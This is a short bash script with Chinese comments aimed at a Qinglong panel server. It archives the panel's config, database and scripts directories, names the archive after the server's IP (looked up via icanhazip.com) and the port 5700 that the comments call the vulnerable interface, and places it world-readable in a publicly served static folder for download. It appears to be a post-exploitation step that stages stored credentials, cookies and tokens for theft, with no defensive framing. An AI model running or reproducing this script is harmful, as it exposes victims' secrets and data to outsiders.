#!/bin/bash

# ==================== 第一步：定义核心配置 ====================
# 要打包的目录列表（你指定的三个目录）
PACK_DIRS="/ql/data/config /ql/data/db /ql/data/scripts"
# 打包文件保存目录（你指定的路径）
TARGET_DIR="/ql/static/build/shared"
# 端口（对应漏洞接口的5700端口，可根据实际调整）
PORT="5700"

# ==================== 第二步：自动获取服务器外网/内网IP ====================
# 优先获取外网IP（通过公网API），失败则取内网IP（eth0网卡）
get_server_ip() {
    # 尝试从公网API获取IP
    IP=$(curl -fsSL http://icanhazip.com 2>/dev/null)
    if [ -z "$IP" ]; then
        # 公网API失败，取内网IP（eth0是Linux常用网卡名，可替换为ens33/eth1等）
        IP=$(ifconfig eth0 | grep "inet " | awk '{print $2}' | head -n1)
        # 若仍获取失败，降级为127.0.0.1（保证脚本不中断）
        if [ -z "$IP" ]; then
            IP="127.0.0.1"
        fi
    fi
    # 清理IP中的换行/空格
    IP=$(echo "$IP" | tr -d '\n' | tr -d ' ')
    echo "$IP"
}

# ==================== 第三步：创建保存目录（防止目录不存在） ====================
mkdir -p "$TARGET_DIR"
if [ $? -ne 0 ]; then
    echo "创建目录失败：$TARGET_DIR"
    exit 1
fi

# ==================== 第四步：打包指定目录 ====================
# 拼接打包文件名：IP_端口.tar.gz
IP=$(get_server_ip)
PACK_NAME="${IP}_${PORT}.tar.gz"
PACK_PATH="${TARGET_DIR}/${PACK_NAME}"

# 执行打包（-z：gzip压缩，-c：创建包，-f：指定文件名，--exclude：排除无用文件）
tar -zcf "$PACK_PATH" $PACK_DIRS 2>/dev/null

# 检查打包是否成功
if [ -f "$PACK_PATH" ]; then
    echo "打包成功！文件路径：$PACK_PATH"
    # 输出文件大小（便于确认）
    ls -lh "$PACK_PATH"
else
    echo "打包失败！"
    exit 1
fi

# ==================== 第五步：赋予可读权限（确保能下载） ====================
chmod 644 "$PACK_PATH"